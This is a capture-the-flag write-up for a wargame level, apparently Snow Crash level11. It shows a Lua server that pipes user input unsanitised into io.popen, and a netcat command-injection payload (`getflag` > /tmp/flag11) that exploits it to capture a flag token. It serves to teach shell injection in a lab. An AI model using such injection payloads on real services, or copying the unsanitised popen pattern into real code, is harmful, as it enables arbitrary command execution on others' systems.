# level11 solve

To begin, when we get logged and trying to see if we got the file we can see we have one file

```
$ ls
> level11.lua
```

It's a <a href="https://fileinfo.com/extension/lua">Lua</a> file, so we decide to check what he contain. 

And multiple line was interesting.

```lua
 1  #!/usr/bin/env lua
 2  local socket = require("socket")
 3  local server = assert(socket.bind("127.0.0.1", 5151))
 4  function hash(pass)
 5    prog = io.popen("echo "..pass.." | sha1sum", "r")
 6    data = prog:read("*all")
 7    prog:close()
 8    data = string.sub(data, 1, 40)
 9    return data
10  end

11  while 1 do
12    local client = server:accept()
13    client:send("Password: ")
14    client:settimeout(60)
15    local l, err = client:receive()
16    if not err then
17        print("trying " .. l)
18        local h = hash(l)
19        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
20            client:send("Erf nope..\n");
21        else
22            client:send("Gz you dumb*\n")
23        end
24    end
25    client:close()
26  end
```

But two were more intriguing than the others, <a href="https://man7.org/linux/man-pages/man3/popen.3.html">popen</a> and <a href="https://opensharing.fr/commandes-linux-sha1sum">sha1sum</a>

```
$ man popen
> The popen() function opens a process by creating a pipe, forking,
> and invoking the shell.  Since a pipe is by definition
> unidirectional, the type argument may specify only reading or
> writing, not both; the resulting stream is correspondingly read-
> only or write-only.
> 
> The command argument is a pointer to a null-terminated string
> containing a shell command line.  This command is passed to
> /bin/sh using the -c flag; interpretation, if any, is performed
> by the shell.
```

After that we conclude that was popen the thing to work with,
so let's try to connect on the listenner

remember :

```
> 3  local server = assert(socket.bind("127.0.0.1", 5151))
```

```
$ nc localhost 5151
> password : 
```

Maybe we need to inject code for the popen, let's try

```
$ nc localhost 5151
> password : `getflag` > /tmp/flag11
```

Verifying the file

```
$ cat /tmp/flag11
> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level10">previous level</a> - <a href="../../level12">next level</a>
